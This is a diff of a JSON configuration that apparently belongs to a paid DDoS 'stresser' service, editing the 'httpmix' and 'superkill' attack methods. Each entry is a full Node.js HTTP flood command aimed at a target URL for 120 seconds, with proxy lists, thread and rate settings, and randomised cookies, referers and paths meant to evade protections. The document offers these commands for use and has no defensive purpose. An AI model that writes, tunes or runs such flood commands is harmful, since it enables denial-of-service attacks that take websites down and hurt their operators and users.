@@ -12,7 +12,7 @@
         "visibility": "VIP"
     },
     "httpmix": {
-        "command": "node --max-old-space-size=65536 httpmix POST \"url\" 120 10 128 live.txt --query 1 --delay 1 --cookie \"bypassing=%RAND%\" --referer rand --http mix --close --randpath --parsed --reset --multipath 5 --header \"User-Agent: Mozilla/5.0#Accept: */*\" --ua \"Mozilla/5.0 (Windows NT 10.0; Win64; x64)\" --header \"Authorization: Bearer token123#X-Custom-Header: value123\"",
+        "command": "node --max-old-space-size=65536 httpmix GET \"url\" 120 10 128 live.txt --query 1 --delay 1 --cookie \"bypassing=%RAND%\" --referer rand --http mix --close --randpath --parsed --reset --multipath 5 --header \"User-Agent: Mozilla/5.0#Accept: */*\" --ua \"Mozilla/5.0 (Windows NT 10.0; Win64; x64)\" --header \"Authorization: Bearer token123#X-Custom-Header: value123\"",
         "url": "url",
         "time": 120,
         "visibility": "VIP"
@@ -24,7 +24,7 @@
         "visibility": "VIP"
     },
     "superkill": {
-        "command": "node --max-old-space-size=65536 superkill -m POST -u url -s 120 -p live.txt -t 10 -r 999 --delay 1 --full true --ratelimit true --query true --debug false",
+        "command": "node --max-old-space-size=65536 superkill -m POST -u url -s 120 -t 10 -p live.txt -v 2 --full true --delay 1 -q true -d false ",
         "url": "url",
         "time": 120,
         "visibility": "VIP"
